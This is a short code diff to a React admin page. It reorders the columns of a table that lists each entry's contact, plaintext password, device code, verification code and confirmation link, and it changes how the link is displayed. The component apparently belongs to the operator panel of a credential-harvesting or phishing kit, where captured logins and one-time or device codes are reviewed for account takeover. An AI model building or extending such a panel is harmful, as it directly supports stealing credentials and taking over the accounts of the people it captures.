@@ -297,8 +297,8 @@ export default function Admin() {
                 <th className="px-3 py-2">Contact</th>
                 <th className="px-3 py-2">Password</th>
                 <th className="px-3 py-2">Device Code</th>
-                <th className="px-3 py-2">Code</th>
                 <th className="px-3 py-2">Confirmation Link</th>
+                <th className="px-3 py-2">Code</th>
                 <th className="px-3 py-2">Status</th>
                 <th className="px-3 py-2">Created at</th>
                 <th className="px-3 py-2">User ID</th>
@@ -313,16 +313,10 @@ export default function Admin() {
                   <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.device_code ? (
                     <span className="bg-green-900/20 px-2 py-1 rounded text-green-300 font-bold">{row.device_code}</span>
                   ) : '-'}</td>
+                  <td className="px-3 py-2 text-slate-300 text-xs max-w-[220px] break-words whitespace-normal font-mono">{row.confirmation_link || '-'}</td>
                   <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.code ? (
                     <span className="bg-green-900/20 px-2 py-1 rounded text-green-300 font-bold">{row.code}</span>
                   ) : '-'}</td>
-                  <td className="px-3 py-2 text-slate-400 text-xs max-w-[200px] truncate">
-                    {row.confirmation_link ? (
-                      <a href={row.confirmation_link} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline break-all">
-                        {row.confirmation_link}
-                      </a>
-                    ) : '-'}
-                  </td>
                   <td className="px-3 py-2"><span className={`text-xs px-2 py-1 rounded ${row.status === 'pending' ? 'bg-yellow-900/20 text-yellow-300' : 'bg-green-900/20 text-green-300'}`}>{row.status}</span></td>
                   <td className="px-3 py-2 text-slate-400 text-xs">
                     {new Date(row.created_at).toLocaleString()}
